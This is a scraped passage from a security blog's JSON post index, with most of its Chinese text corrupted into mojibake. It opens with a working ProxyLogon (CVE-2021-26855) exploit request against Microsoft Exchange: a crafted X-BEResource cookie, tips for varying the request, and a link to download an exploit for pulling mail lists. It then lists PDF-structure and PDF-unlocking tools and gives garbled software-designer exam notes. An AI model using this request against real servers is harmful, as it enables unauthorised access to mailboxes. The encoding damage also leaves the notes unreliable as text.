&lt;AuthPackage&gt;Ntlm&lt;/AuthPackage&gt; &lt;ServerExclusiveConnect&gt;on&lt;/ServerExclusiveConnect&gt; &lt;CertPrincipalName&gt;None&lt;/CertPrincipalName&gt; &lt;GroupingInformation&gt;Default-First-Site-Name&lt;/GroupingInformation&gt; &lt;/Protocol&gt; &lt;Protocol&gt; &lt;Type&gt;WEB&lt;/Type&gt; &lt;/Protocol&gt; &lt;/Account&gt; &lt;/Response&gt;&lt;/Autodiscover&gt; è¿è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š exp: 12345678910111213141516POST /ecp/target.js HTTP/1.1Host: 192.168.179.2User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: closeCookie: X-BEResource=[name]@WIN-N15UUJ077R0.saucerman.com:443/autodiscover/autodiscover.xml?#~1941962754Content-Type: text/xmlContent-Length: 348&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;&lt;Request&gt;&lt;EMailAddress&gt;administrator@saucerman.com&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;&lt;/Request&gt;&lt;/Autodiscover&gt; å…¶ä¸­ï¼š url ä¸­çš„ /ecp/target.js ä¸æ˜¯ç»å¯¹çš„ï¼Œå¯ä»¥æ˜¯å…¶ä»–çš„è·¯å¾„ /ecp/XXX.png X-BEResource ç”¨äºä»£ç†è¯·æ±‚ï¼Œå…¶åŸæœ¬æ›´åˆé€‚åº”è¯¥æ˜¯ [fqdn]~BackEndServerVersionï¼ŒBackEndServerVersion åº”è¯¥å¤§äº 1941962752 WIN-N15UUJ077R0.saucerman.com ä¸ºç›®æ ‡åœ°å€ å¦‚æœä¸éœ€è¦ç‰¹åˆ«æŒ‡å®šç«¯å£å·ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å€¼ï¼š X-BEResource=WIN-N15UUJ077R0.saucerman.com/autodiscover/autodiscover.xml?#~1941962753 è¿™æ ·ä¼šå¯¼è‡´ä»¥443ç«¯å£è®¿é—® https://win-n15uuj077r0.saucerman.com/autodiscover/autodiscover.xml?#:444/ecp/target.js è·å–é‚®ä»¶åˆ—è¡¨ï¼Œä¸‹è½½ exp ï¼š https://github.com/charlottelatest/CVE-2021-26855","tags":[{"name":"POC","slug":"POC","permalink":"https://hodlyounger.github.io/tags/POC/"},{"name":"pocsuite","slug":"pocsuite","permalink":"https://hodlyounger.github.io/tags/pocsuite/"},{"name":"POC/RCE","slug":"POC-RCE","permalink":"https://hodlyounger.github.io/tags/POC-RCE/"},{"name":"Exchange","slug":"Exchange","permalink":"https://hodlyounger.github.io/tags/Exchange/"},{"name":"ä¿¡æ¯å®‰å…¨","slug":"ä¿¡æ¯å®‰å…¨","permalink":"https://hodlyounger.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POCæ¢ç´¢","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"Exchange","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢/Exchange","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/Exchange/"}]},{"title":"ã€å·¥å…·ã€‘PDFè§£å¯†","date":"2024-05-28T02:11:45.441Z","path":"G_å·¥å…·/ã€å·¥å…·ã€‘PDFè§£å¯†/","text":"æ¦‚è¿°ï¼šPDFæ–‡ä»¶ç»“æ„åŠè§£å¯†ç›¸å…³å·¥å…· Blogs explaining the internals of PDF https://www.adobe.com/devnet/pdf/pdf_reference.html https://resources.infosecinstitute.com/pdf-file-format-basic-structure/ https://planetpdf.com/navigating-the-internal-structure-of-a-pdf-document/ https://blog.idrsolutions.com/2013/01/understanding-the-pdf-file-format-overview/ https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF https://www.w3.org/WAI/WCAG20/Techniques/ua-notes/pdf Tools PdfView - Peeking into the Internals of PDFs - View the structure of PDF xpdf - Extracting text etcâ€¦ pdf2xml - Extracting structure etcâ€¦ Dragon00007/DecryptPDF: Decrypt/Unlock pdf files","tags":[{"name":"Tools","slug":"Tools","permalink":"https://hodlyounger.github.io/tags/Tools/"},{"name":"PDF","slug":"PDF","permalink":"https://hodlyounger.github.io/tags/PDF/"}],"categories":[{"name":"G_å·¥å…·","slug":"G-å·¥å…·","permalink":"https://hodlyounger.github.io/categories/G-%E5%B7%A5%E5%85%B7/"}]},{"title":"ã€è½¯ä»¶è®¾è®¡å¸ˆã€‘è€ƒå‰æ•´ç†","date":"2024-05-11T00:28:48.080Z","path":"B_ä¹¦ç±èµ„æ–™/è½¯ä»¶è®¾è®¡å¸ˆ/ã€è½¯ä»¶è®¾è®¡å¸ˆã€‘è€ƒå‰æ•´ç†/","text":"æ¦‚è¿°ï¼šè½¯ä»¶è®¾è®¡å¸ˆè€ƒå‰åˆ·é¢˜è®°å½• ã€Šè½¯ä»¶è®¾è®¡å¸ˆã€‹ æœªåˆ†ç±» ç³»ç»Ÿæ€»çº¿é€šå¸¸ç”¨æ¥è¿æ¥è®¡ç®—æœºä¸­çš„å„ä¸ªéƒ¨ä»¶ï¼ˆå¦‚CPUã€å†…å­˜å’ŒI/Oè®¾å¤‡ï¼‰ï¼›ç‰‡å†…æ€»çº¿è¿æ¥å¯„å­˜å™¨å’Œè¿ç®—å™¨éƒ¨ä»¶ï¼›å¤–éƒ¨æ€»çº¿è¿æ¥æ¥å£å’Œå¤–è®¾ã€DMAæ§åˆ¶å™¨å’Œä¸­æ–­æ§åˆ¶å™¨ã€‚ ç¨‹åºä¸­ç”¨åˆ°çš„æ˜¯è™šæ‹Ÿåœ°å€ï¼Œç¡¬ä»¶ä¸­è®¿é—®çš„é€šå¸¸æ˜¯ç‰©ç†åœ°å€ ä¸­æ–­å‘é‡æä¾›çš„æ˜¯ä¸­æ–­æœåŠ¡ç¨‹åºçš„å…¥å£åœ°å€æˆ–å­˜æ”¾ä¸­æ–­æœåŠ¡ç¨‹åºçš„é¦–åœ°å€ è¡¥ç è¡¨ç¤ºçš„æ­£ç¡®é¡¹ï¼š è¡¥ç é›¶çš„è¡¨ç¤ºæ˜¯å”¯ä¸€çš„ å¯ä»¥å°†å‡æ³•è¿ç®—è½¬åŒ–ä¸ºåŠ æ³•è¿ç®— ç¬¦å·ä¸ºå¯ä»¥ä¸æ•°å€¼ä½ä¸€èµ·å‚åŠ è¿ç®— ä¸çœŸå€¼çš„å¯¹åº”å…³ç³»ä¸ç›´è§‚ æŒ‡ä»¤æµæ°´çº¿çš„è®¡ç®—æ–¹å¼ä¸º T=maxâ¡1â‰¤iâ‰¤n{di}âˆ—n+1â‰¤iâ‰¤n{di}T = \\max_{1 \\leq i \\leq n} \\{ d_i \\}*n + {1 \\leq i \\leq n}\\{ d_i \\}T=max1â‰¤iâ‰¤nâ€‹{diâ€‹}âˆ—n+1â‰¤iâ‰¤n{diâ€‹} è¡¨ç¤ºå±‚å¯¹åº”ç”¨å±‚æ¶ˆæ¯è¿›è¡Œå‹ç¼©ã€åŠ å¯† åº”ç”¨å±‚ï¼šâ‘  ä¿æŒåº”ç”¨ç¨‹åºä¹‹é—´å»ºç«‹è¿æ¥æ‰€éœ€è¦çš„æ•°æ®è®°å½•ï¼Œä¸ºç”¨æˆ·æœåŠ¡ï¼›â‘¡ ç¡®å®šè¿›ç¨‹ä¹‹é—´é€šä¿¡çš„æ€§è´¨ã€‚ è¡¨ç¤ºå±‚ï¼šâ‘  å¤„ç†é€šä¿¡ä¿¡å·çš„è¡¨ç¤ºæ–¹æ³•ï¼Œè¿›è¡Œä¸åŒæ ¼å¼ä¹‹é—´çš„ç¿»è¯‘ï¼Œå¹¶è´Ÿè´£æ•°æ®çš„åŠ è§£å¯†ã€æ•°æ®çš„å‹ç¼©ä¸æ¢å¤ ä¼šè¯å±‚ï¼šâ‘  ä¸»è¦è´Ÿè´£ä¸¤ä¸ªä¼šè¯è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œå³ä¸¤ä¸ªä¼šè¯å±‚å®ä½“ä¹‹é—´çš„ä¿¡æ¯äº¤æ¢å’Œç®¡ç†æ•°çš„äº¤æ¢ï¼›â‘¡ ä¸ºé€šä¿¡è¿›è¡Œå»ºç«‹è¿æ¥ ä¼ è¾“å±‚ï¼šç«¯åˆ°ç«¯çš„è¿æ¥ã€‚â‘  å‘ç”¨æˆ·æä¾›å¯é çš„ç«¯åˆ°ç«¯çš„æœåŠ¡ï¼Œå®ƒå±è”½äº†ä¸‹å±‚çš„æ•°æ®é€šä¿¡ç»†èŠ‚ï¼Œè®©ç”¨ç”¨æˆ·åŠåº”ç”¨ç¨‹åºä¸éœ€è¦è€ƒè™‘å®é™…çš„é€šä¿¡æ–¹æ³•ï¼›â‘¡ä¸»è¦åŠŸèƒ½ä¸ºè´Ÿè´£æ€»ä½“çš„æ•°æ®ä¼ è¾“å’Œæ•°æ®æ§åˆ¶ ç½‘ç»œå±‚ï¼šåˆ†ç»„ä¼ è¾“å’Œè·¯ç”±é€‰æ‹©ã€‚â‘  ä¸»è¦è´Ÿè´£è·¯ç”±ã€é€‰æ‹©åˆé€‚çš„è·¯å¾„å’Œè¿›è¡Œé˜»å¡æ§åˆ¶ç­‰åŠŸèƒ½ï¼›â‘¡ ç®¡ç†æ•°æ®é€šä¿¡ï¼Œå®ç°ç«¯åˆ°ç«¯çš„æ•°æ®ä¼ é€æœåŠ¡ï¼Œå³å°†æ•°æ®è®¾æ³•ä»æºç«¯ç»è¿‡è‹¥å¹²ä¸ªä¸­é—´èŠ‚ç‚¹ä¼ é€åˆ°ç›®çš„ç«¯ã€‚ æ•°æ®é“¾è·¯å±‚ï¼šä¼ é€ä»¥å¸§ä¸ºå•ä½çš„ä¿¡æ¯ã€‚â‘  åœ¨ä¸¤ä¸ªä¸»æœºä¸Šå»ºç«‹æ•°æ®é“¾è·¯è¿æ¥ï¼Œå‘ç‰©ç†å±‚ä¼ è¾“æ•°æ®ä¿¡å·ï¼Œå¹¶å¯¹ä¿¡å·è¿›è¡Œå¤„ç†ä½¿ä¹‹æ— å·®é”™å¹¶åˆç†åœ°ä¼ è¾“ï¼›â‘¡ ç‰©ç†åœ°å€å¯»å€ã€æ•°æ®çš„æˆå¸§ã€æµé‡æ§åˆ¶ã€æ•°æ®çš„æ£€é”™å’Œé‡å‘ç­‰ï¼›â‘¢ è§£å†³çš„æ˜¯æ‰€ä¼ è¾“æ•°æ®çš„å‡†ç¡®æ€§çš„é—®é¢˜ï¼Œæ§åˆ¶ç½‘ç»œå±‚ä¸ç‰©ç†å±‚ä¹‹é—´çš„é€šä¿¡ã€‚ ç‰©ç†å±‚ï¼šäºŒè¿›åˆ¶ä¼ è¾“ã€‚ HTTPSåŠ å¯†HTTPæ¶ˆæ¯çš„æ–¹å¼æ˜¯ä¼šè¯å¯†é’¥+å¯¹ç§°åŠ å¯† å…¥ä¾µæ£€æµ‹ç³»ç»Ÿä¸€èˆ¬åªåšæ£€æµ‹ï¼Œä¸åšé˜²å¾¡ è½¯ä»¶è‘—ä½œæƒå±äºè‡ªç„¶äººçš„ï¼Œè¯¥è‡ªç„¶äººæ­»äº¡åï¼Œåœ¨æœ‰æ•ˆæœŸå†…ï¼Œç»§æ‰¿äººåªèƒ½ç»§æ‰¿ç‰¹å®šæƒåˆ©ï¼Œä¸æ˜¯æ‰€æœ‰æƒåˆ©ï¼Œæ¯”å¦‚ç½²åæƒå°±ä¸èƒ½ç»§æ‰¿ã€‚ ç£ç›˜è°ƒåº¦åˆ†ä¸ºç§»è‡‚è°ƒåº¦å’Œæ—‹è½¬è°ƒåº¦ä¸¤ç±»ï¼Œåœ¨ç§»è‡‚è°ƒåº¦çš„ç®—æ³•ä¸­ï¼Œå…ˆæ¥å…ˆæœåŠ¡å’Œæœ€çŸ­å¯»æ‰¾æ—¶é—´ä¼˜å…ˆç®—æ³•å¯èƒ½ä¼šéšæ—¶æ”¹å˜ç§»åŠ¨è‡‚çš„è¿è¡Œæ–¹å‘ åœ¨ç£ç›˜è°ƒåº¦ç®¡ç†ä¸­ï¼Œé€šå¸¸å…ˆè¿›è¡Œç§»è‡‚è°ƒåº¦ï¼Œå†è¿›è¡Œæ—‹è½¬è°ƒåº¦ã€‚åœ¨è®¿é—®ä¸åŒæŸ±é¢çš„ä¿¡æ¯æ—¶ï¼Œéœ€è¦å…ˆè¿›è¡Œç§»è‡‚è°ƒåº¦ï¼Œä¹‹åè¿›è¡Œæ—‹è½¬è°ƒåº¦ã€‚åœ¨è®¿é—®åŒä¸€ç£é“çš„ä¿¡æ¯æ—¶ï¼Œåªéœ€è¦è¿›è¡Œæ—‹è½¬è°ƒåº¦ã€‚ è‹¥ç£ç›˜çš„è½¬é€Ÿæé«˜ä¸€å€ï¼Œåˆ™æ—‹è½¬ç­‰å¾…æ—¶é—´å‡åŠ çº¿æ€§è¡¨é‡‡ç”¨é“¾è¡¨å­˜å‚¨ç»“æ„çš„ç‰¹ç‚¹åŒ…æ‹¬ï¼š æ‰€éœ€ç©ºé—´å¤§å¤§å°ä¸è¡¨é•¿æˆæ­£æ¯” æ’å…¥å’Œé˜è¿°æ“ä½œä¸éœ€è¦ç§»åŠ¨å…ƒç´  æ— é¡»äº‹å…ˆä¼°è®¡å­˜å‚¨æ§ä»¶å¤§å° âš ï¸ ä¸å¯éšæœºè®¿é—®è¡¨ä¸­çš„ä»»ä¸€å…ƒç´  å¯¹é‡‡ç”¨é¢å‘å¯¹è±¡æ–¹æ³•å¼€å‘çš„ç³»ç»Ÿè¿›è¡Œæµ‹è¯•æ—¶ï¼Œé€šå¸¸ä»ä¸åŒå±‚æ¬¡è¿›è¡Œæµ‹è¯•ã€‚å¯¹ç±»ä¸­å®šä¹‰çš„æ¯ä¸ªæ–¹æ³•è¿›è¡Œæµ‹è¯•å±äºç®—æ³•å±‚ åœ¨è¾“å…¥æ¡ä»¶è§„å®šçš„å–å€¼èŒƒå›´çš„æƒ…å†µä¸‹ï¼Œåˆç†çš„è¾“å…¥å’Œä¸åˆç†çš„è¾“å…¥è‡³å°‘éƒ½èƒ½æ‰§è¡Œä¸€æ¬¡å±äºé»‘ç›’æµ‹è¯• ç™½ç›’æµ‹è¯•åŸåˆ™ï¼š åœ¨æ‰€æœ‰çš„é€»è¾‘åˆ¤æ–­ä¸­ï¼Œå–â€œçœŸâ€å’Œå–â€œå‡â€çš„ä¸¤ç§æƒ…å†µè‡³å°‘éƒ½èƒ½æ‰§è¡Œä¸€æ¬¡ ç¨‹åºæ¨¡å—ä¸­çš„æ‰€æœ‰ç‹¬ç«‹è·¯å¾„è‡³å°‘æ‰§è¡Œä¸€æ¬¡ æ¯ä¸ªå¾ªç¯éƒ½åº”åœ¨è¾¹ç•Œæ¡ä»¶å’Œä¸€èˆ¬æ¡ä»¶ä¸‹ä¸ªæ‰§è¡Œä¸€æ¬¡ ç®¡ç†é”®ç›˜æœ€é€‚åˆé‡‡ç”¨çš„I/Oæ§åˆ¶æ–¹å¼æ˜¯ä¸­æ–­æ–¹å¼ã€‚ å“ˆå¤«æ›¼æ ‘å…±æœ‰127ä¸ªç»“ç‚¹ï¼Œå¯¹å…¶è¿›è¡Œå“ˆå¤«æ›¼ç¼–ç ï¼Œå…±èƒ½å¾—åˆ°64ä¸ªå­—ç¬¦çš„ç¼–ç ï¼ˆæ±‚å¶å­èŠ‚ç‚¹çš„ä¸ªæ•°ï¼‰ å¶å­ç»“ç‚¹ï¼šåº¦ä¸º0çš„èŠ‚ç‚¹ï¼Œä¸åº¦ä¸º2çš„èŠ‚ç‚¹ä¹‹é—´å­˜åœ¨å¦‚ä¸‹å…³ç³»ï¼š N0âˆ’N2=1N0-N2 = 1N0âˆ’N2=1 åŒæ—¶ N0+N2=127N0+N2=127N0+N2=127 å·²çŸ¥ä¸€æ£µåº¦ä¸º3çš„æ ‘å¯¸ï¼ˆä¸€ä¸ªèŠ‚ç‚¹çš„åº¦æ˜¯æŒ‡å…¶å­æ ‘çš„æ•°ç›®ï¼Œæ ‘çš„åº¦æ˜¯æŒ‡è¯¥æ ‘ä¸­æ‰€æœ‰èŠ‚ç‚¹çš„åº¦çš„æœ€å¤§å€¼ï¼‰ä¸­æœ‰5ä¸ªåº¦ä¸º1çš„èŠ‚ç‚¹ï¼Œ4ä¸ªåº¦ä¸º2çš„èŠ‚ç‚¹ï¼Œ2ä¸ªåº¦ä¸º3çš„èŠ‚ç‚¹ï¼Œé‚£ä¹ˆï¼Œè¯¥æ ‘ä¸­çš„å¶å­èŠ‚ç‚¹æ•°ç›®ä¸º9 æœ¬é¢˜è€ƒæŸ¥æ•°æ®ç»“æ„çš„åŸºç¡€çŸ¥è¯†è®¾æ ‘ä¸­çš„èŠ‚ç‚¹æ€»æ•°ä¸ºnã€åˆ†æ”¯æ•°ç›®ä¸ºmï¼Œé‚£ä¹ˆn=5+4+2+å¶å­èŠ‚ç‚¹æ•°ï¼Œm=5X1+4X2+2X3åœ¨æ ‘ä¸­ï¼ŒèŠ‚ç‚¹æ€»æ•°ç­‰äºåˆ†æ”¯æ•°ç›®åŠ ä¸Š1ï¼Œå³n=m+1,å› æ­¤ï¼Œå¶å­èŠ‚ç‚¹æ•°=5X1+4X2+2X3+1-5-4-2=9 èŠ‚ç‚¹æ€»æ•°=åˆ†æ”¯æ•°ç›®+1èŠ‚ç‚¹æ€»æ•°=åˆ†æ”¯æ•°ç›®+1èŠ‚ç‚¹æ€»æ•°=åˆ†æ”¯æ•°ç›®+1 $åˆ†æ”¯æ•°ç›®= \\sum_{åº¦({iâ€¦n})*åº¦ä¸ºiçš„èŠ‚ç‚¹ä¸ªæ•°} $ ç”˜ç‰¹å›¾ï¼š ä¸€ç§è¿›åº¦ç®¡ç†çš„å·¥å…· æ˜“äºçœ‹å‡ºæ¯ä¸ªå­ä»»åŠ¡çš„æŒç»­æ—¶é—´ æ˜“äºçœ‹å‡ºç›®å‰é¡¹ç›®çš„å®é™…è¿›åº¦æƒ…å†µ ä¸æ˜“äºçœ‹å‡ºå­ä»»åŠ¡ä¹‹é—´çš„è¡”æ¥å…³ç³» åœ¨è½¯ä»¶ç³»ç»Ÿäº¤ä»˜ç»™ç”¨æˆ·ä½¿ç”¨åï¼Œä¸ºäº†ä½¿ç”¨æˆ·ç•Œé¢æ›´å‹å¥½ï¼Œå¯¹ç³»ç»Ÿçš„å›¾å½¢è¾“å‡ºè¿›è¡Œæ”¹è¿›ï¼Œè¯¥è¡Œä¸ºå±äºæ”¹å–„å‹æ”¹è¿› åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¼šå¼•ç”¨ç¬¬ä¸‰æ–¹ç±»ã€‚ç¬¬ä¸‰æ–¹ç±»åˆä¼šå¼•ç”¨å…¶ä»–ç±»ã€‚æŠŠæ‰€æœ‰çš„ç±»å°è£…åœ¨ä¸€ä¸ªåŒ…ä¸­ï¼Œå°±èƒ½æé«˜å¼€å‘æ•ˆç‡ï¼Œç§°ä¸ºå…±åŒé‡ç”¨åŸåˆ™ã€‚ Cè¯­è¨€ä¸­å…¨å±€å˜é‡çš„å­˜å‚¨ç©ºé—´åœ¨é™æ€æ•°æ®åŒºåˆ†é…ã€‚ Javaè¯­è¨€ç¬¦åˆçš„ç‰¹å¾æœ‰é‡‡ç”¨å³æ—¶ç¼–è¯‘ã€å¯¹è±¡åœ¨å †ç©ºé—´åˆ†é…å’Œè‡ªåŠ¨çš„åƒåœ¾å›æ”¶å¤„ç†ã€‚ ç¡®å®šçš„æœ‰é™è‡ªåŠ¨æœºå’Œä¸ç¡®å®šçš„æœ‰é™è‡ªåŠ¨æœºï¼šä¸ç¡®å®šçš„æœ‰é™è‡ªåŠ¨æœºæ˜¯ä¸€ä¸ªçŠ¶æ€åˆ°å¦ä¸€ä¸ªçŠ¶æ€çš„æ–¹å¼æœ‰å¤šç§ï¼Œç¡®å®šçš„æœ‰é™è‡ªåŠ¨æœºæ˜¯ä¸€ä¸ªçŠ¶æ€åˆ°å¦ä¸€ä¸ªçŠ¶æ€çš„æ–¹å¼åªæœ‰ä¸€ç§ã€‚â€ä¸ç¡®å®šâ€œæ˜¯æŒ‡å½“å‰çŠ¶æ€çš„åç»§çŠ¶æ€æ˜¯ä¸ç¡®å®šçš„ã€‚ è„šæœ¬è¯­è¨€ï¼šä¸»è¦é‡‡ç”¨è§£é‡Šæ–¹å¼å®ç° è„šæœ¬è¯­è¨€å±äºåŠ¨æ€è¯­è¨€ï¼Œå…¶ç¨‹åºç»“æ„å¯ä»¥åœ¨è¿è¡Œä¸­æ”¹å˜ è„šæœ¬è¯­è¨€ä¸€èˆ¬é€šè¿‡è„šæœ¬å¼•æ“è§£é‡Šæ‰§è¡Œï¼Œä¸äº§ç”Ÿç‹¬ç«‹ä¿å­˜çš„ç›®æ ‡ç¨‹åº Cè¯­è¨€å±äºé™æ€è¯­è¨€ï¼Œå…¶æ‰€æœ‰æˆåˆ†å¯åœ¨ç¼–è¯‘æ—¶ç¡®å®š ç¼–è¯‘è¯­è¨€ï¼š æ‰§è¡Œæ•ˆç‡æ›´é«˜ æ ‡è®°è¯­è¨€ï¼š æ ‡è®°è¯­è¨€å¸¸ç”¨äºæè¿°æ ¼å¼åŒ–å’Œé“¾æ¥ æ±‡ç¼–è¯­è¨€ï¼š æ±‡ç¼–è¯­è¨€æºç¨‹åºä¸­çš„æŒ‡ä»¤è¯­å¥å°†è¢«ç¿»è¯‘æˆæœºå™¨ä»£ç  æ±‡ç¼–ç¨‹åºä»¥æ±‡ç¼–è¯­è¨€æºç¨‹åºä¸ºè¾“å…¥ï¼Œä»¥æœºå™¨è¯­è¨€è¡¨ç¤ºçš„ç›®æ ‡ç¨‹åºä¸ºè¾“å‡º æ±‡ç¼–è¯­è¨€çš„æŒ‡ä»¤è¯­å¥å¿…é¡»å…·æœ‰æ“ä½œç å­—æ®µï¼Œå¯ä»¥æ²¡æœ‰æ“ä½œæ•°å­—æ®µ ç¼–è¯‘æ–¹å¼ åœ¨æœºå™¨ä¸Šè¿è¡Œçš„ç›®æ ‡ç¨‹åºå®Œå…¨ç‹¬ç«‹äºæºç¨‹åº è¿è¡Œä¸æºç¨‹åºç­‰ä»·çš„ç›®æ ‡ç¨‹åº è§£é‡Šæ–¹å¼ è¿è¡Œæ—¶ï¼Œç›´æ¥æ‰§è¡Œæºç¨‹åºæˆ–æºç¨‹åºçš„å†…éƒ¨å½¢å¼ è¿è¡Œç¨‹åºçš„æ§åˆ¶æƒåœ¨è§£é‡Šç¨‹åº ä¸äº§ç”Ÿç‹¬ç«‹çš„ç›®æ ‡ç¨‹åº ä¸ºäº†å®ç°å¤šçº§ä¸­æ–­ï¼Œä¿å­˜ç¨‹åºç°åœºä¿¡æ¯æœ€æœ‰æ•ˆçš„æ–¹æ³•æ˜¯ä½¿ç”¨å †æ ˆ å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯æŒ‡ä¸²ä¸­æ‰€å«å­—ç¬¦çš„ä¸ªæ•° æ•£åˆ—è¡¨ï¼ˆå“ˆå¸Œè¡¨ï¼‰åŠå…¶æŸ¥æ‰¾ç‰¹ç‚¹ï¼š åœ¨æ•£åˆ—è¡¨ä¸­è¿›è¡ŒæŸ¥æ‰¾æ—¶ï¼Œéœ€è¦ä¸å“ˆå¸Œæ¡¶ä¸­æ‰€æœ‰çš„å…³é”®å­—è¿›è¡Œæ¯”è¾ƒï¼Œç›´åˆ°æ‰¾åˆ°ä¸ç›®æ ‡å…³é”®å­—ç›¸ç­‰çš„å…ƒç´ æˆ–è€…ç¡®å®šç›®æ ‡å…ƒç´ ä¸å­˜åœ¨äºå“ˆå¸Œæ¡¶ä¸­ã€‚ æ•£åˆ—è¡¨çš„è£…å¡«å› å­è¶Šå°ï¼Œå‘ç”Ÿå†²çªçš„å¯èƒ½æ€§å°±ä¼šè¶Šå°ã€‚ä½†æ˜¯å“ˆå¸Œè¡¨å¡«è£…å› å­è¿‡å°æ—¶ï¼Œä¼šæµªè´¹å¤§é‡ç©ºé—´ï¼Œè€Œå½“è£…å¡«å› å­è¿‡å¤§æ—¶ï¼Œåˆ™ä¼šå¯¼è‡´å†²çªçš„æ¦‚ç‡å¢åŠ ï¼Œå½±å“æ•£åˆ—è¡¨çš„æ€§èƒ½ã€‚ ç”¨çº¿æ€§æ¢æµ‹æ³•è§£å†³å†²çªå¯èƒ½ä¼šäº§ç”Ÿèšé›†é—®é¢˜ï¼Œå³å‡ºç°å¤§é‡å¯†é›†çš„å†²çªï¼Œä½¿å¾—å“ˆå¸Œæ¡¶ä¸­çš„å…ƒç´ å‡ºç°èšé›†ã€‚ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œå¯ä»¥é‡‡ç”¨å…¶ä»–çš„æ¢æµ‹æ–¹æ³•ï¼Œå¦‚äºŒæ¬¡æ¢æµ‹ã€åŒé‡æ•£åˆ—ç­‰ã€‚ ç”¨é“¾åœ°å€æ³•è§£å†³å†²çªå¯ä»¥ä¿è¯æ¯ä¸ªæ¡¶ä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œå¹³å‡æŸ¥æ‰¾é•¿åº¦ä¸º1ï¼Œä½†æ˜¯å½“ä¸€ä¸ªåŒç§æœ‰å¤šä¸ªå…ƒç´ å¸ˆï¼Œä¾ç„¶éœ€è¦éå†é“¾è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ æ‰èƒ½æ‰¾åˆ°ç›®æ ‡å…ƒç´ ï¼Œå¹³å‡æŸ¥æ‰¾é•¿åº¦å°±ä¼šå¢åŠ ã€‚ ä¿¡å·é‡Sçš„å–å€¼èŒƒå›´ä¸º èµ„æºä¸ªæ•°Rã€è¿›ç¨‹ä¸ªæ•°P ä¿¡å·é‡Sçš„å–å€¼èŒƒå›´ä¸ºï¼š âˆ’(Pâˆ’R)âˆ¼R-(P-R) \\sim Râˆ’(Pâˆ’R)âˆ¼R å‘ç”Ÿæ­»é”çš„æœ€å°iå€¼ä¸ºï¼šR&lt;=Pâˆ—(Sâˆ’1)+1R &lt;= P*(S-1)+1R&lt;=Pâˆ—(Sâˆ’1)+1 æ•°æ®åº“åŸºæœ¬æ¦‚å¿µï¼šé€æ˜ åˆ†ç‰‡é€æ˜æ˜¯æŒ‡ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºä¸éœ€è¦çŸ¥é“é€»è¾‘ä¸Šè®¿é—®çš„è¡¨å…·ä½“æ˜¯æ€ä¹ˆåˆ†å—å­˜å‚¨çš„ å¤åˆ¶é€æ˜æ˜¯æŒ‡é‡‡ç”¨å¤åˆ¶ç»“æŸçš„åˆ†æ­¥æ–¹æ³•ï¼Œç”¨æˆ·ä¸éœ€è¦çŸ¥é“æ•°æ®æ˜¯å¤åˆ¶åˆ°å“ªäº›èŠ‚ç‚¹ï¼Œå¦‚ä½•å¤åˆ¶çš„ ä½ç½®é€æ˜æ˜¯æŒ‡ç”¨æˆ·æ— é¡»çŸ¥é“æ•°æ®å­˜æ”¾çš„ç‰©ç†ä½ç½® é€»è¾‘é€æ˜å³æŒ‡å±€éƒ¨æ•°æ®æ¨¡å‹é€æ˜ï¼Œæ˜¯æŒ‡ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºæ— é¡»çŸ¥é“å±€éƒ¨åœºåœ°ä½¿ç”¨çš„æ˜¯é‚£ç§æ•°æ®æ¨¡å‹ è‹¥äº†è§£é—®é¢˜çš„è§£ç©ºé—´ï¼Œå¹¶ä»¥å¹¿åº¦ä¼˜å…ˆçš„æ–¹å¼æœç´¢è§£ç©ºé—´ï¼Œåˆ™é‡‡ç”¨çš„æ˜¯åˆ†æ”¯é™ç•Œç®—æ³•ç­–ç•¥ï¼›ä»¥æ·±åº¦ä¼˜å…ˆçš„æ–¹å¼æœç´¢è§£ç©ºé—´ï¼Œåˆ™é‡‡ç”¨å›æº¯ç®—æ³•è®¾è®¡ç­–ç•¥ã€‚ è½¯ä»¶å˜æ›´æ§åˆ¶æ˜¯å˜æ›´ç®¡ç†çš„é‡è¦å†…å®¹ï¼Œè¦æœ‰æ•ˆè¿›è¡Œå˜æ›´æ§åˆ¶ï¼Œéœ€è¦å€ŸåŠ©é…ç½®æ•°æ®åº“å’ŒåŸºçº¿çš„æ¦‚å¿µã€‚é…ç½®æ•°æ®åº“ä¸€èˆ¬åŒ…æ‹¬å¼€å‘åº“ã€å—æ§åº“å’Œäº§å“åº“ã€‚ å¯¹äºå¤§å¤šæ•°é€šç”¨ç¨‹åºè®¾è®¡è¯­è¨€ï¼Œç”¨ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•æè¿°å…¶è¯­æ³•å³å¯ã€‚ å¯¹é«˜çº§è¯­è¨€æºç¨‹åºè¿›è¡Œç¼–è¯‘æˆ–è§£é‡Šçš„è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºå¤šä¸ªé˜¶æ®µï¼Œè§£é‡Šæ–¹å¼åŒ…å«ï¼š è¯æ³•åˆ†æ è¾“å…¥ï¼šæºç¨‹åº è¾“å‡ºï¼šè®°å·æµ 